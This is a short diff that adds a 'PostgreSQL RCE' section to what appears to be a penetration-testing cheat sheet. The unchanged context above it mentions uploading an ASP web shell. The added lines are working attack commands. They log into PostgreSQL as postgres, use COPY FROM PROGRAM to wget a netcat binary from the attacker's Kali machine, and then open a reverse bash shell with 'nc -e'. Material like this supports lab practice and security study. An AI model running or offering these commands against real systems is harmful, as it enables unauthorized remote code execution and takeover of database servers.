@@ -180,3 +180,15 @@ cadavar <ip>
 
 put shell.asp
 ```
+---
+# PostgreSQL RCE
+```bash
+psql -h $IP -p 5437 -U postgres  
+
+postgres=# \c postgres;
+postgres=# DROP TABLE IF EXISTS cmd_exec;
+postgres=# CREATE TABLE cmd_exec(cmd_output text);
+postgres=# COPY cmd_exec FROM PROGRAM 'wget http://Kali IP/nc';
+postgres=# DELETE FROM cmd_exec;
+postgres=# COPY cmd_exec FROM PROGRAM 'nc -n <kali IP> 5437 -e /usr/bin/bash';
+```
